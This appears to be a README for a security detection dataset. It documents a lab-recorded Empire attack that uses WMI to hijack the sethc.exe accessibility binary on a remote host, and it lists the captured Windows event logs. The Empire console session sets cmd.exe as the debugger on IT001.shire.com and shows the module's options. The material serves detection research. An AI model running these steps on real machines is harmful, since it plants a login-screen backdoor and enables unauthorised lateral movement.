# Empire Invoke WMI Debugger

Uses WMI to set the debugger for a target binary on a remote machine to be cmd.exe or a stager.

## Technique(s) ID

T1047

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_wmi_debugger.tar.gz](./empire_invoke_wmi_debugger.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18215622

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             539 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |               6 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             172 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             131 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              40 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              11 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               9 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               8 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               3 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            1920 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             325 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             312 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             156 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              23 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              19 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              14 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               7 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             449 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               3 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Stopping Command                                       |               3 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |

## Attacker Activity

```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_wmi_debugger
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > info

              Name: Invoke-WMIDebugger
            Module: powershell/lateral_movement/invoke_wmi_debugger
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Uses WMI to set the debugger for a target binary on a remote
  machine to be cmd.exe or a stager.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     False                                 Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                     separated.                              
  Cleanup      False                                 Switch. Disable the debugger for the    
                                                     specified TargetBinary.                 
  TargetBinary True        sethc.exe                 Target binary to set the debugger for   
                                                     (sethc.exe, Utilman.exe, osk.exe,       
                                                     Narrator.exe, or Magnify.exe)           
  UserName     False                                 [domain\]username to use to execute     
                                                     command.                                
  Binary       False       C:\Windows\System32\cmd.  Binary to set for the debugger.         
                           exe                     
  RegPath      False       HKLM:Software\Microsoft\  Registry location to store the script   
                           Network\debug             code. Last element is the key name.     
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set Listener https
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set Listener ''
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > info

              Name: Invoke-WMIDebugger
            Module: powershell/lateral_movement/invoke_wmi_debugger
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Uses WMI to set the debugger for a target binary on a remote
  machine to be cmd.exe or a stager.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     False                                 Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True        IT001.shire.com           Host[s] to execute the stager on, comma 
                                                     separated.                              
  Cleanup      False                                 Switch. Disable the debugger for the    
                                                     specified TargetBinary.                 
  TargetBinary True        sethc.exe                 Target binary to set the debugger for   
                                                     (sethc.exe, Utilman.exe, osk.exe,       
                                                     Narrator.exe, or Magnify.exe)           
  UserName     False                                 [domain\]username to use to execute     
                                                     command.                                
  Binary       False       C:\Windows\System32\cmd.  Binary to set for the debugger.         
                           exe                     
  RegPath      False       HKLM:Software\Microsoft\  Registry location to store the script   
                           Network\debug             code. Last element is the key name.     
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_wmi_debugger) > execute                                          
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 7
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_wmi_debugger
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > Invoke-Wmi executed on "IT001.shire.com" to set the debugger for sethc.exe to be C:\Windows\System32\cmd.exe.

(Empire: powershell/lateral_movement/invoke_wmi_debugger) >
```